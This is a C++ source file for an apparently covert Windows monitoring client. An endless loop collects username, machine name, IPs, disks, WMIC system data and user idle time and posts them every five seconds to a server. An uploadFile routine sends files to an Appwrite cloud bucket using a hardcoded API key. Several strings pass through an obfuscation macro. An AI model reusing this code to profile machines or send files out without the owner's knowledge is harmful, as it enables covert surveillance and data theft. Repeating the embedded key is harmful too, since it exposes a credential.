#include"App.h"
#include "curl/curl.h"
#include <filesystem>
namespace fs = std::filesystem;
int64_t lastInfoQuery = 0;
Information lastInfo;
const std::string SERVER_BASE = OBFUSCATED("http://localhost:3000");
const std::string APPWRITEAPI_KEY = OBFUSCATED("c8de7ce28b6a16d8a2a6531672b6549547c7f3cd65af70782ac7e5bdd15733c49193d7e5ca02a01591ef6fc8313f974feea517af6f68e5593e33fd0b82392691aeff4d6792f057b5c08e5f2a76a81237436eed75358006393400bbb4828dc886f9fd07d55a47a36de99b0920e1c423f9ccedb72a5b6d26963f74df6236a2622f");
const std::string APPWRITE_PROJECTID = OBFUSCATED("65f1b67fa4509b598d6e");
void uploadFile(std::string file);
static PDH_HQUERY cpuQuery;
static PDH_HCOUNTER cpuTotal;

void WaitForConnnection()
{
    while (!InternetIsWorking())
    {
        Sleep(1000);
    }
}
size_t readCallback(void *ptr, size_t size, size_t nitems, void *data)
{
    size_t bytes_read;

    /* I'm doing it this way to get closer to what the reporter is doing.
       Technically we don't need to do this, we could just use the default read
       callback which is fread. Also, 'size' param is always set to 1 by libcurl
       so it's fine to pass as buffer, size, nitems, instream. */
    bytes_read = fread(ptr, 1, (size * nitems), (FILE *)data);

    return bytes_read;
}
size_t writeCallback(void *pContents, size_t size, size_t nmemb, void *pUser)
{
    ((std::string *)pUser)->append((char *)pContents, size * nmemb);
    return size * nmemb;
}
void uploadFile(std::string file)
{
    CURL *curl = curl_easy_init();

    std::string keyHeader = "X-Appwrite-Key: ";
    keyHeader += APPWRITEAPI_KEY;
    std::string projectHeader = "X-Appwrite-Project: ";
    projectHeader += APPWRITE_PROJECTID;
    struct curl_slist *headerlist = NULL;

    long responseCode = 0;

    auto fName = fs::path(file).filename().string();
    auto size = GetFileSize(file);

    curl_httppost *post = NULL;
    curl_httppost *last = NULL;

    std::string link = "https://cloud.appwrite.io/v1/storage/buckets/65f40a214b5d0993434e/files";

    curl_formadd(&post, &last,
                 CURLFORM_COPYNAME, "file",
                 CURLFORM_FILE, file.c_str(),
                 CURLFORM_END);
    auto id = generate_uuid_v4();
    curl_formadd(&post, &last,
                 CURLFORM_COPYNAME, "fileId",
                 CURLFORM_COPYCONTENTS, id.c_str(),
                 CURLFORM_END);

    headerlist = curl_slist_append(headerlist, "X-Appwrite-Response-Format: 1.4.0");
    headerlist = curl_slist_append(headerlist, "X-Appwrite-Project: 65f1b67fa4509b598d6e");
    headerlist = curl_slist_append(headerlist, keyHeader.c_str());
    headerlist = curl_slist_append(headerlist, projectHeader.c_str());

    curl_easy_setopt(curl, CURLOPT_URL, link.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
    curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    auto res = curl_easy_perform(curl);
    
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    curl_slist_free_all(headerlist);
    curl_easy_cleanup(curl);
}
bool UploadInfo(std::string info)
{
    CURL *curl = curl_easy_init();
    struct curl_slist *headerlist = curl_slist_append(NULL, "Content-Type: application/json");
    std::string link = SERVER_BASE + "/client/info";
    curl_easy_setopt(curl, CURLOPT_URL, link.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, info.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);

    auto res = curl_easy_perform(curl);
    curl_slist_free_all(headerlist);
    return res == CURLE_OK;
}
bool InternetIsWorking()
{
    bool isWorking = false;
    auto link = "http://clients3.google.com/generate_204";
    std::string output;
    auto curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_CONNECT_ONLY, 1L);
    curl_easy_setopt(curl, CURLOPT_POST, 0);
    curl_easy_setopt(curl, CURLOPT_URL, link);
    for (size_t i = 0; i < 3; i++)
    {
        CURLcode res = curl_easy_perform(curl);
        isWorking = res == CURLE_OK;
        if (isWorking)
            break;
        Sleep(400);
    }
    curl_easy_cleanup(curl);
    return isWorking;
}
int64_t getIdleTime()
{
    LASTINPUTINFO info{0, 0};
    info.cbSize = sizeof(LASTINPUTINFO);

    BOOL res = GetLastInputInfo(&info);
    return (int)((GetTickCount() - info.dwTime) / 1000);
}
void Start()
{
    initCPUCounter();
    std::cout << "Hello, from monitor!\n";
    std::chrono::high_resolution_clock clk;

    for (;;)
    {
        auto start = clk.now();
        auto inf = Information::getInformation();
        auto now = clk.now();
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - start).count();
        auto infostr = Information2JSON(inf);
        json jsn;

        jsn["mid"] = GetMachineID();
        jsn["info"] = infostr;

        UploadInfo(jsn.dump());
        // std::cout << infostr << "\n";
        std::cout << elapsed << "\n";
        Sleep(5000);
    }
}
Information Information::getInformation()
{

    Information info;
    info.arch = IsSystemX64() ? "X64" : "x86";
    info.compileTime = getCompileTime();
    info.windowsVersion = getWindowsVersion();

    info.cpu = GetCpuInfo();

    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    info.cpuCores = sysinfo.dwNumberOfProcessors;

    bool starting = lastInfoQuery == 0;
    std::thread th1([&]()
                    { info.cpuInfo = starting || lastInfo.cpuInfo.size() == 0 ? getWmicResult("cpu") : lastInfo.cpuInfo; });
    std::thread th2([&]()
                    { info.osInfo = starting || lastInfo.cpuInfo.size() == 0 ? getWmicResult("os") : lastInfo.osInfo; });
    std::thread th3([&]()
                    { info.driveInfo = starting || lastInfo.cpuInfo.size() == 0 ? getWmicResult("diskdrive") : lastInfo.driveInfo; });
    th1.join();
    th2.join();
    th3.join();

    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);

    info.totalRam = memInfo.ullTotalPhys;
    info.freeRam = memInfo.ullAvailPhys;

    info.cpuPercentage = getCpuPercentage();

    info.disks = starting || lastInfo.cpuInfo.size() == 0 ? getDisks() : lastInfo.disks;
    info.mainBinary = starting || lastInfo.cpuInfo.size() == 0 ? GetExecutable() : lastInfo.mainBinary;
    info.hostBinary = starting || lastInfo.cpuInfo.size() == 0 ? getExecutingBinary() : lastInfo.hostBinary;
    info.screen = starting || lastInfo.cpuInfo.size() == 0 ? getScreenDimensions() : lastInfo.screen;
    info.isInteractive = IsUserInteractive();
    info.userName = getUsername();
    info.machine = getMachineName();
    info.machineId = GetMachineID();

    if (lastInfo.localIp == "" || (getSystemTime() - lastInfoQuery) > 60)
    {
        info.localIp = getLocalIP();
    }
    else
    {
        info.localIp = lastInfo.localIp;
    }

    if (lastInfo.remoteIp == "" || (getSystemTime() - lastInfoQuery) > 60)
    {
        auto res = GetBytesFromURL(OBFUSCATED("https://api.ipify.org"));
        if (res.data.size() > 0)
        {
            info.remoteIp.resize(res.data.size());
            memcpy((void *)&info.remoteIp[0], (void *)&res.data[0], res.data.size());
        }
    }
    else
    {
        info.remoteIp = lastInfo.remoteIp;
    }
    info.idleTime = getIdleTime();

    info.systemTime = getSystemTime();
    lastInfoQuery = getSystemTime();
    lastInfo = info;

    //     info.cpuPercentage = 0;
    return info;
}
Information::Information() : arch(""), compileTime(""), cpu(""), cpuCores(0), cpuInfo({}), cpuPercentage(0), disks(std::vector<Disk>()), dotnetVersions(std::vector<std::string>()), driveInfo({}), freeRam(0), hostBinary(""), isInteractive(false), localIp(""), machine(""), machineId(), mainBinary(""), osInfo({}), remoteIp(""), screen(Screen{}), systemTime(0), totalRam(0), userName(""), windowsVersion(WindowsVersion{}), idleTime(0)
{
}
std::string Information2JSON(Information info)
{
    std::string infoStr;
    json jsn;
    jsn["arch"] = info.arch;
    jsn["compileTime"] = info.compileTime;
    jsn["cpu"] = info.cpu;
    jsn["cpuCores"] = info.cpuCores;
    jsn["cpuInfo"] = info.cpuInfo;

    auto diskArr = json::array();
    for (size_t i = 0; i < info.disks.size(); i++)
    {
        auto disk = info.disks[i];
        diskArr.push_back({
            {"name", disk.name},
            {"freeSpace", disk.freeSpace},
            {"total", disk.total},
        });
    }
    jsn["disks"] = diskArr;

    jsn[OBFUSCATED("dotnetVersions")] = info.dotnetVersions;
    jsn["driveInfo"] = info.driveInfo;
    jsn["freeRam"] = info.freeRam;
    jsn["hostBinary"] = info.hostBinary;
    jsn["isInteractive"] = info.isInteractive;
    jsn["localIp"] = info.localIp;
    jsn["machine"] = info.machine;
    jsn["machineId"] = info.machineId;
    jsn["mainBinary"] = info.mainBinary;
    jsn["osInfo"] = info.osInfo;
    jsn["remoteIp"] = info.remoteIp;
    jsn["screen"] = {
        {"width", info.screen.width},
        {"height", info.screen.height}};
    jsn["systemTime"] = info.systemTime;
    jsn["totalRam"] = info.totalRam;
    jsn["userName"] = info.userName;
    jsn["idleTime"] = info.idleTime;
    jsn["windowsVersion"] = {
        {"buildNumber", info.windowsVersion.buildNumber},
        {"majorVersion", info.windowsVersion.majorVersion},
        {"minorVersion", info.windowsVersion.minorVersion},
        {"platformId", info.windowsVersion.platformId},
        {"name", info.windowsVersion.name},
    };
    ;

    infoStr = jsn.dump(4);
    return infoStr;
}
std::string getCompileTime()
{
    std::string compTime = __DATE__;
    compTime += " ";
    compTime += __TIME__;
    return compTime;
}
int64_t getSystemTime()
{
    auto now = std::chrono::system_clock::now();
    auto epoch = std::chrono::duration_cast<std::chrono::seconds>(
                     now.time_since_epoch())
                     .count();
    return epoch;
}
Screen getScreenDimensions()
{
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    Screen screen{
        width, height};

    return screen;
}
WindowsVersion getWindowsVersion()
{
    WindowsVersion version;
    HMODULE hMod;
    OSVERSIONINFOEX osV;
    OSVERSIONINFOEX *os = &osV;
    RtlGetVersion_FUNC func;
#ifdef UNICODE
    OSVERSIONINFOEXW *osw = os;
#else
    OSVERSIONINFOEXW o;
    OSVERSIONINFOEXW *osw = &o;
#endif

    hMod = LoadLibrary(TEXT("ntdll.dll"));
    if (hMod)
    {
        func = (RtlGetVersion_FUNC)GetProcAddress(hMod, "RtlGetVersion");
        if (func != 0)
        {

            ZeroMemory(osw, sizeof(*osw));
            osw->dwOSVersionInfoSize = sizeof(*osw);
            func(osw);
#ifndef UNICODE
            os->dwBuildNumber = osw->dwBuildNumber;
            os->dwMajorVersion = osw->dwMajorVersion;
            os->dwMinorVersion = osw->dwMinorVersion;
            os->dwPlatformId = osw->dwPlatformId;
            os->dwOSVersionInfoSize = sizeof(*os);
            DWORD sz = sizeof(os->szCSDVersion);
            WCHAR *src = osw->szCSDVersion;
            unsigned char *dtc = (unsigned char *)os->szCSDVersion;
            while (*src)
                *dtc++ = (unsigned char)*src++;
            *dtc = '\0';
#endif
            version.buildNumber = os->dwBuildNumber;
            version.majorVersion = os->dwMajorVersion;
            version.minorVersion = os->dwMinorVersion;
            version.platformId = os->dwPlatformId;
            try
            {
                auto versName = GetStringValueFromHKLM(OBFUSCATED(R"(SOFTWARE\Microsoft\Windows NT\CurrentVersion)"), "ProductName");
                version.name = versName;
            }
            catch (std::exception &e)
            {
                std::cerr << e.what();
            }
        }
    }
    return version;
}
std::string getMachineName()
{
    std::string machine;

    char buff[1024];
    DWORD size = sizeof(buff);
    GetComputerNameA(buff, &size);
    machine = buff;

    return machine;
}
std::string getLocalIP()
{
    std::string ip;
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) == 0)
    {

        char hostname[NI_MAXHOST];
        if (gethostname(hostname, NI_MAXHOST) != SOCKET_ERROR)
        {
            // std::cerr << "gethostname failed: " << WSAGetLastError() << std::endl;

            struct addrinfo *result = nullptr;
            struct addrinfo hints;

            ZeroMemory(&hints, sizeof(hints));
            hints.ai_family = AF_UNSPEC; // IPv4 or IPv6
            hints.ai_socktype = SOCK_STREAM;
            hints.ai_protocol = IPPROTO_TCP;

            if (getaddrinfo(hostname, nullptr, &hints, &result) == 0)
            {

                char ipstr[INET6_ADDRSTRLEN];

                // Iterate through addresses and print IP address
                for (struct addrinfo *ptr = result; ptr != nullptr; ptr = ptr->ai_next)
                {
                    void *addr;
                    if (ptr->ai_family == AF_INET)
                    { // IPv4
                        struct sockaddr_in *ipv4 = reinterpret_cast<struct sockaddr_in *>(ptr->ai_addr);
                        addr = &(ipv4->sin_addr);
                    }
                    else
                    { // IPv6
                        continue;
                        // struct sockaddr_in6 *ipv6 = reinterpret_cast<struct sockaddr_in6 *>(ptr->ai_addr);
                        // addr = &(ipv6->sin6_addr);
                    }

                    inet_ntop(ptr->ai_family, addr, ipstr, sizeof(ipstr));
                    if (strlen(ipstr) > 0)
                    {
                        ip = ipstr;
                        break;
                    }
                    std::cout << "Local IP address: " << ipstr << std::endl;
                }

                freeaddrinfo(result);
            }
        }
    }
    WSACleanup();
    return ip;
}
std::string getExecutingBinary()
{
    char path[1024];

    memset(path, 0, sizeof(path));
    DWORD size = sizeof(path);
    auto module = GetCurrentModule();
    size = GetModuleFileNameA(module, path, size);
    std::string exe = path;

    return exe;
}
std::string getUsername()
{
    const DWORD size = 1024;
    const char name[size] = {0};
    std::string user;
    GetUserNameA((LPSTR)name, (LPDWORD)&size);
    user = name;
    return user;
}
std::vector<Disk> getDisks()
{
    std::vector<Disk> disks;

    const int size = 4096;
    char *szDrives = new char[size]();
    if (GetLogicalDriveStringsA(size, szDrives))

        for (int i = 0; i < 100; i += 4)
        {
            if (szDrives[i] != (char)0)
            {
                auto driveLetter = std::string{szDrives[i], szDrives[i + 1], szDrives[i + 2]};

                ULARGE_INTEGER total{0};
                ULARGE_INTEGER free{0};

                if (GetDiskFreeSpaceExA(driveLetter.c_str(), nullptr, &total, &free) != 0)
                {
                    Disk disk;
                    disk.name = driveLetter;
                    disk.freeSpace = (int64_t)(free.QuadPart);
                    disk.total = (int64_t)(total.QuadPart);
                    disks.push_back(disk);
                }
            }
        }
    delete[] szDrives;
    return disks;
}
double getCpuPercentage()
{
    PDH_FMT_COUNTERVALUE counterVal;

    PdhCollectQueryData(cpuQuery);
    PdhGetFormattedCounterValue(cpuTotal, PDH_FMT_DOUBLE, NULL, &counterVal);

    return counterVal.doubleValue;
}
void initCPUCounter()
{
    PdhOpenQuery(NULL, NULL, &cpuQuery);
    // You can also use L"\\Processor(*)\\% Processor Time" and get individual CPU values with PdhGetFormattedCounterArray()
    PdhAddEnglishCounter(cpuQuery, "\\Processor(_Total)\\% Processor Time", NULL, &cpuTotal);
    PdhCollectQueryData(cpuQuery);
}
std::map<std::string, std::string> getWmicResult(std::string cmd)
{
    std::map<std::string, std::string> result;
    std::stringstream ss;

    ss << cmd << " get /format:list";

    auto res = StartProcess("wmic.exe", ss.str(), 0, nullptr);
    auto lines = StringUtils::split(res.result, '\n');

    for (auto &line : lines)
    {
        line = StringUtils::trim(line);
        if (line.size() > 0)
        {
            auto pair = StringUtils::split(line, '=');
            if (pair.size() == 2)
            {
                pair[1] = StringUtils::trim(pair[1]);
                if (pair[1].size() > 0)
                {
                    result[pair[0]] = pair[1];
                }
                // result.insert(pair[0],pair[1]);
            }
        }
    }

    return result;
}
std::string GetCpuInfo()
{
    // 4 is essentially hardcoded due to the __cpuid function requirements.
    // NOTE: Results are limited to whatever the sizeof(int) * 4 is...
    std::array<int, 4> integerBuffer = {};
    constexpr size_t sizeofIntegerBuffer = sizeof(int) * integerBuffer.size();

    std::array<char, 64> charBuffer = {};

    // The information you wanna query __cpuid for.
    // https://learn.microsoft.com/en-us/cpp/intrinsics/cpuid-cpuidex?view=vs-2019
    constexpr std::array<unsigned int, 3> functionIds = {
        // Manufacturer
        //  EX: "Intel(R) Core(TM"
        0x8000'0002,
        // Model
        //  EX: ") i7-8700K CPU @"
        0x8000'0003,
        // Clockspeed
        //  EX: " 3.70GHz"
        0x8000'0004};

    std::string cpu;

    for (int id : functionIds)
    {
        // Get the data for the current ID.
        __cpuid(integerBuffer.data(), id);

        // Copy the raw data from the integer buffer into the character buffer
        memcpy(charBuffer.data(), integerBuffer.data(), sizeofIntegerBuffer);

        // Copy that data into a std::string
        cpu += std::string(charBuffer.data());
    }

    return cpu;
}

